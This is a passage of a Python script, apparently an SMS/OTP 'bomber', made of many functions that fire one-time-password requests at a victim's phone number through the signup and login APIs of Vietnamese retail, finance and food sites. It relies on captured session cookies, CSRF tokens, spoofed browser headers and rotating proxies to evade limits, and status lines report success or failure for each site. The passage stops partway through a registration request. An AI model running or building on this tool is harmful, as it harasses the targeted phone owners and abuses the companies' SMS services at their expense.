        'referer': 'https://invest.vnsc.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'type': 'PHONE_VERIFICATION_OTP',
        'phone': sdt,
        'email': '',
    }

    try:
        response = requests.post('https://api.vinasecurities.com/auth/v1/otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VNSC NOR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VNSC NOR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)



def bibomart():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://bibomart.com.vn',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'type': 1,
    }

    try:
        response = requests.post('https://prod.bibomart.net/customer_account/v2/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BIBOMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BIBOMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sbiz():
    cookies = {
        'PHPSESSID': 'en5flstp28ksppips40vhoe3k8',
        'lang': 'vi',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=en5flstp28ksppips40vhoe3k8; lang=vi',
        'origin': 'https://sbiz.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://sbiz.com.vn/register/otp/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'register',
        'username': sdt,
    }

    try:
        response = requests.post('https://sbiz.com.vn/ajax_send_otp/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SBIZ | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SBIZ | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thieuhoa():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IlJPRFFpbi9ZMUVBZWlqbStaS2FJcHc9PSIsInZhbHVlIjoiNWtMRHE3dUxvK2NzcDEwTWw5anhXVGNxeU9NRE5OUGRRV2dCNGJrMUEyNnJmZGYzQW85cy9LUHZqb2hCMUR4cDl5cE1SWEozWWJVYUZIbzNSV3pHeUN5b3RuV05Yc0ovOWxzbnJCNzJlUDRJeVg0RmlCVk1WOUtub2pVUE9ZaFIiLCJtYWMiOiI2Y2EzNDgzODBlOWVjMGY3ZjU5YTZhZTBjZWY5M2VhYmY2M2E0ZmQxZWJiNjVkMjg3MDVhMDdiMDVkOTM2MWE5In0%3D',
        'laravel_session': 'eyJpdiI6IlQyNjdyalZNcXBnMkFwMUNQcnhPbEE9PSIsInZhbHVlIjoibEtoaDcrdGIweXBqM045S1B0bEtacmFpTTZWRTgycFBjdTRKVURTNlhSbzZ6U1M3K2lhUjFncW53Q0hvUnRVVFlta3BCa2FPbWtjUmx6aWFnMjNRZmVyMGNpU0c3eDZVOXI1dGdIeVp3K0E5a0JLSnZReWhVd3dFODdGNCtra1MiLCJtYWMiOiJiZjcwYzBmNzRhOWVlYzA2MjE5NjEzYTBlMDAyYTlhYmQ2MjMxY2VjN2M5MGI5ZjdkNmFiNmZmZDUyNTVkM2ExIn0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IlJPRFFpbi9ZMUVBZWlqbStaS2FJcHc9PSIsInZhbHVlIjoiNWtMRHE3dUxvK2NzcDEwTWw5anhXVGNxeU9NRE5OUGRRV2dCNGJrMUEyNnJmZGYzQW85cy9LUHZqb2hCMUR4cDl5cE1SWEozWWJVYUZIbzNSV3pHeUN5b3RuV05Yc0ovOWxzbnJCNzJlUDRJeVg0RmlCVk1WOUtub2pVUE9ZaFIiLCJtYWMiOiI2Y2EzNDgzODBlOWVjMGY3ZjU5YTZhZTBjZWY5M2VhYmY2M2E0ZmQxZWJiNjVkMjg3MDVhMDdiMDVkOTM2MWE5In0%3D; laravel_session=eyJpdiI6IlQyNjdyalZNcXBnMkFwMUNQcnhPbEE9PSIsInZhbHVlIjoibEtoaDcrdGIweXBqM045S1B0bEtacmFpTTZWRTgycFBjdTRKVURTNlhSbzZ6U1M3K2lhUjFncW53Q0hvUnRVVFlta3BCa2FPbWtjUmx6aWFnMjNRZmVyMGNpU0c3eDZVOXI1dGdIeVp3K0E5a0JLSnZReWhVd3dFODdGNCtra1MiLCJtYWMiOiJiZjcwYzBmNzRhOWVlYzA2MjE5NjEzYTBlMDAyYTlhYmQ2MjMxY2VjN2M5MGI5ZjdkNmFiNmZmZDUyNTVkM2ExIn0%3D',
        'origin': 'https://thieuhoa.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://thieuhoa.com.vn/dang-nhap',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_token': 'esnlORfZpbivxOLPYNNt7siNcSbaMPxQs3yC2lk0',
        'phone': sdt,
    }

    try:
        response = requests.post('https://thieuhoa.com.vn/phone_login', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THIEUHOA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THIEUHOA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def guardian():
    cookies = {
        'SRV': '92f1c88d-78ea-46cc-a177-e20fe4d82a02',
        'PHPSESSID': 'f8c4g12cif92nlr8c5bul4hhkt',
        'form_key': 'hCDIFnr6otgBpV5N',
        'private_content_version': 'a21077efbd01778e4e806c261907e039',
        'form_key': 'hCDIFnr6otgBpV5N',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'section_data_ids': '{%22messages%22:1723359937}',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'SRV=92f1c88d-78ea-46cc-a177-e20fe4d82a02; PHPSESSID=f8c4g12cif92nlr8c5bul4hhkt; form_key=hCDIFnr6otgBpV5N; private_content_version=a21077efbd01778e4e806c261907e039; form_key=hCDIFnr6otgBpV5N; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; section_data_ids={%22messages%22:1723359937}',
        'origin': 'https://www.guardian.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.guardian.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'telephone': sdt,
    }

    proxy = get_random_proxy()
    if proxy and check_proxy(proxy):
        proxies = {
            'http': proxy,
            'https': proxy
        }
        try:
            response = requests.post(
            'https://www.guardian.com.vn/rest/V1/smsOtp/generateOtpForNewAccount',
            cookies=cookies,
            headers=headers,
            json=json_data,proxies=proxies)
            response.raise_for_status()
            print(f"GUARDIAN | TRẠNG THÁI : {Fore.GREEN}THÀNH CÔNG (Proxy: {proxy}){Style.RESET_ALL}")
        except requests.exceptions.RequestException:
            print(f"GUARDIAN | TRẠNG THÁI : {Fore.RED}THẤT BẠI (Proxy: {proxy}){Style.RESET_ALL}")
            print(response.text)
    else:
        print(f"GUARDIAN | TRẠNG THÁI : {Fore.RED}KHÔNG CÓ PROXY HỢP LỆ{Style.RESET_ALL}")

def guardiannor():
    cookies = {
        'SRV': '92f1c88d-78ea-46cc-a177-e20fe4d82a02',
        'PHPSESSID': 'f8c4g12cif92nlr8c5bul4hhkt',
        'form_key': 'hCDIFnr6otgBpV5N',
        'private_content_version': 'a21077efbd01778e4e806c261907e039',
        'form_key': 'hCDIFnr6otgBpV5N',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'section_data_ids': '{%22messages%22:1723359937}',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'SRV=92f1c88d-78ea-46cc-a177-e20fe4d82a02; PHPSESSID=f8c4g12cif92nlr8c5bul4hhkt; form_key=hCDIFnr6otgBpV5N; private_content_version=a21077efbd01778e4e806c261907e039; form_key=hCDIFnr6otgBpV5N; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; section_data_ids={%22messages%22:1723359937}',
        'origin': 'https://www.guardian.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.guardian.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'telephone': sdt,
    }
    try:
        response = requests.post('https://www.guardian.com.vn/rest/V1/smsOtp/generateOtpForNewAccount',
        cookies=cookies,
        headers=headers,
        json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GUARDIAN NOR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GUARDIANR NOR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)



def boshop():
    cookies = {
        'laravel_session': 'BiAmhKPcBQB10icyh2JfgxADse4P4xnPSiQ5JmGd',
        'XSRF-TOKEN': 'eyJpdiI6InFZSXpleU9wUlV3TXYrTjdSTTlkVVE9PSIsInZhbHVlIjoiYzhNNmNOM3BnN3NkRWxyakpDQVV2WUdcL2E5VGZJUXYyZTNVUlV5VVRNcUVQd3grQUhQeTZ2QkV6bW1iU2Y4WlgiLCJtYWMiOiJmY2ZhMDhjYzI3ZTM0OGQ2YTc1MjY5MzViZDkxNzBkNzM1NTJiM2ZjMGQ5ZWVjZjg4YzRlYTJhMzc3MWY4ZGVkIn0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=BiAmhKPcBQB10icyh2JfgxADse4P4xnPSiQ5JmGd; XSRF-TOKEN=eyJpdiI6InFZSXpleU9wUlV3TXYrTjdSTTlkVVE9PSIsInZhbHVlIjoiYzhNNmNOM3BnN3NkRWxyakpDQVV2WUdcL2E5VGZJUXYyZTNVUlV5VVRNcUVQd3grQUhQeTZ2QkV6bW1iU2Y4WlgiLCJtYWMiOiJmY2ZhMDhjYzI3ZTM0OGQ2YTc1MjY5MzViZDkxNzBkNzM1NTJiM2ZjMGQ5ZWVjZjg4YzRlYTJhMzc3MWY4ZGVkIn0%3D',
        'Origin': 'https://www.boshop.vn',
        'Referer': 'https://www.boshop.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-CSRF-TOKEN': 'fGY8fYuvQgAwwNP4ku8bU8tKbM1wwfgOpiGFW3CK',
        'X-XSRF-TOKEN': 'eyJpdiI6InFZSXpleU9wUlV3TXYrTjdSTTlkVVE9PSIsInZhbHVlIjoiYzhNNmNOM3BnN3NkRWxyakpDQVV2WUdcL2E5VGZJUXYyZTNVUlV5VVRNcUVQd3grQUhQeTZ2QkV6bW1iU2Y4WlgiLCJtYWMiOiJmY2ZhMDhjYzI3ZTM0OGQ2YTc1MjY5MzViZDkxNzBkNzM1NTJiM2ZjMGQ5ZWVjZjg4YzRlYTJhMzc3MWY4ZGVkIn0=',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://www.boshop.vn/api-mobile/phone-login-send-otp', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BOSHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BOSHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def gas24h():
    cookies = {
        'PHPSESSID': 'eopapfgva4kfrrdbvhbsaehpai',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': 'PHPSESSID=eopapfgva4kfrrdbvhbsaehpai',
        'priority': 'u=1, i',
        'referer': 'https://www.gas24h.com.vn/signup.html',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'otp[phone]': sdt,
        'otp[status]': '1',
    }

    try:
        response = requests.get('https://www.gas24h.com.vn/ajax/sendOtp', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GAS24H | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GAS24H | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def zl188():
    cookies = {
        '_require_login': '6',
        'XSRF-TOKEN': 'eyJpdiI6ImF0b0FZMzZoVjhBVmUwTmpxenE4Nmc9PSIsInZhbHVlIjoiMlNlY24zZUVZbkdXOE16MXd2eXNncEZsZFJTcVByVzBYamlvb2tmRFJJa1wveUVHWVwvYkdLajQrQzByRkFueHJLVnNaRVk5aDhIWElQaFQ2Q05YT2dTZz09IiwibWFjIjoiZDIxMjE5ZjQ0YWVlYzhkZmMyNTllYTQ1OWFlMjhhMjczNDcxZTI3MzJlN2VlNjVkYTFlNTYyZTBlMWVkNWFmNSJ9',
        'laravel_session': 'eyJpdiI6Im1Db2JTS251WVRZVFlMMzV1dkxmd2c9PSIsInZhbHVlIjoiT3VhYXJReGY2ZVwvaUs3MVlMTkF1dGxldDlRMGtxK1A2RVViampIaSszVTQ0U05lUjM3cTA0bGpDRVpZbU5CdFZ0aGJYdFJSbnpmZXV1UHhoUG5Ud0VBPT0iLCJtYWMiOiI3MmEzM2E4MmNkNGM2NDNlNzJiZWJhNjgzODUwYThlNGVlMTJiMzk4YjQ1MTBkNTA1MDdiMTZjN2MyODM5OTJjIn0%3D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_require_login=6; XSRF-TOKEN=eyJpdiI6ImF0b0FZMzZoVjhBVmUwTmpxenE4Nmc9PSIsInZhbHVlIjoiMlNlY24zZUVZbkdXOE16MXd2eXNncEZsZFJTcVByVzBYamlvb2tmRFJJa1wveUVHWVwvYkdLajQrQzByRkFueHJLVnNaRVk5aDhIWElQaFQ2Q05YT2dTZz09IiwibWFjIjoiZDIxMjE5ZjQ0YWVlYzhkZmMyNTllYTQ1OWFlMjhhMjczNDcxZTI3MzJlN2VlNjVkYTFlNTYyZTBlMWVkNWFmNSJ9; laravel_session=eyJpdiI6Im1Db2JTS251WVRZVFlMMzV1dkxmd2c9PSIsInZhbHVlIjoiT3VhYXJReGY2ZVwvaUs3MVlMTkF1dGxldDlRMGtxK1A2RVViampIaSszVTQ0U05lUjM3cTA0bGpDRVpZbU5CdFZ0aGJYdFJSbnpmZXV1UHhoUG5Ud0VBPT0iLCJtYWMiOiI3MmEzM2E4MmNkNGM2NDNlNzJiZWJhNjgzODUwYThlNGVlMTJiMzk4YjQ1MTBkNTA1MDdiMTZjN2MyODM5OTJjIn0%3D',
        'origin': 'https://188.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://188.com.vn/dang-ky?urlreturn=https://188.com.vn',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-csrf-token': 'hwE1i4LXemydpFmCCSJ594iMrzLNSZcrf43Kelp1',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'otp_type': '1',
    }

    try:
        response = requests.post('https://188.com.vn/get-token-auth-phone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("188.COM.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("188.COM.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonszl():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 2,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonszlresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': None,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/resend', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSZLRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSZLRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonssms():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 1,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonssmsresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 1,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/resend', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSSMSRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSSMSRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sapporopremiumbeer():
    cookies = {
        '_pc_vis': '0299d3f0f9b96c38',
        '_pc_ses': '1734775549831',
        'PHPSESSID': 'gjf1lf43diptl8krosd67gb626',
        '_pc_tss': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzQ3NzU2MzksInB0ZyI6eyJ2aTpzcnUiOlsxN10sIl9jIjoxNzM0Nzc1NTUwLCJfdSI6MTczNDc3NTU1MH0sImV4cCI6MTczNDc3NzQzOX0.dE7GQG4KnrsVef_8CH3e0MBCUgaEqk64tIlMdXue7Go',
        '_pc_tvs': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzQ3NzU2MzksInB0ZyI6eyJjbWY6c2ciOnsiODA0NSI6MTJ9LCJfYyI6MTczMzMwMTk3NCwiX3UiOjE3MzQ3NzU2MzksInRnIjp7IjciOjEyfX0sImV4cCI6MTc2NjMxMTYzOX0.7CEaZt2bV2GeVN9-JNSJefIW2ik_b3wUuvhCGwY9KXQ',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '_pc_vis=0299d3f0f9b96c38; _pc_ses=1734775549831; PHPSESSID=gjf1lf43diptl8krosd67gb626; _pc_tss=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzQ3NzU2MzksInB0ZyI6eyJ2aTpzcnUiOlsxN10sIl9jIjoxNzM0Nzc1NTUwLCJfdSI6MTczNDc3NTU1MH0sImV4cCI6MTczNDc3NzQzOX0.dE7GQG4KnrsVef_8CH3e0MBCUgaEqk64tIlMdXue7Go; _pc_tvs=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzQ3NzU2MzksInB0ZyI6eyJjbWY6c2ciOnsiODA0NSI6MTJ9LCJfYyI6MTczMzMwMTk3NCwiX3UiOjE3MzQ3NzU2MzksInRnIjp7IjciOjEyfX0sImV4cCI6MTc2NjMxMTYzOX0.7CEaZt2bV2GeVN9-JNSJefIW2ik_b3wUuvhCGwY9KXQ',
        'origin': 'https://www.sapporopremiumbeer.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.sapporopremiumbeer.com.vn/vi_VN/account/register',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    data = {
        'registration_form[phone]': sdt,
        'registration_form[email]': '',
        'registration_form[password][first]': '123123aA@',
        'registration_form[password][second]': '123123aA@',
        'registration_form[fullname]': 'dat ggg',
